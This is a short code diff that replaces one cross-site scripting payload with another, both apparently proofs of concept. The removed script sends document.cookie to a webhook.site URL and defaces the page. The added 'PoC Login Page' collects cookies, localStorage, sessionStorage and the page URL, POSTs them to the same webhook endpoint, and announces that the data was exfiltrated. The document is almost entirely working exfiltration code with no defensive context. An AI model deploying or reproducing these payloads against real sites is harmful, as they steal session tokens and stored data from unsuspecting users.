@@ -1,23 +1,33 @@
-(async () => {
-  alert("💀 Hacked by S7if 💀");
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>PoC Login Page</title>
+  </head>
+  <body>
+    <h1>Please wait...</h1>
 
-  const data = encodeURIComponent(JSON.stringify({
-    cookies: document.cookie,
-    time: new Date().toISOString()
-  }));
+    <script>
+      let data = `
+🍪 Cookies:
+${document.cookie}
 
-  try {
-    await fetch(https://webhook.site/3dd75195-9a2f-4eb2-90e4-a036f13bdd9b?data=${data}, {
-      method: "GET",
-      mode: "no-cors" // يحاول تجاوز سياسة CORS لكنه محدود
-    });
-  } catch (e) {
-    // ممكن تضيف لوج هنا لو حبيت
-  }
+📦 LocalStorage:
+${JSON.stringify(localStorage, null, 2)}
 
-  document.body.innerHTML = `
-    <div style="color:#0f0; background:#111; font-family: monospace; font-size: 2em; height: 100vh; display: flex; justify-content: center; align-items: center;">
-      Saif
-    </div>
-  `;
-})();
+📦 SessionStorage:
+${JSON.stringify(sessionStorage, null, 2)}
+
+🌍 URL:
+${location.href}
+      `;
+
+      fetch("https://webhook.site/3dd75195-9a2f-4eb2-90e4-a036f13bdd9b", {
+        method: "POST",
+        headers: { "Content-Type": "text/plain" },
+        body: data
+      });
+
+      alert("XSS triggered via /login and data exfiltrated!");
+    </script>
+  </body>
+</html>
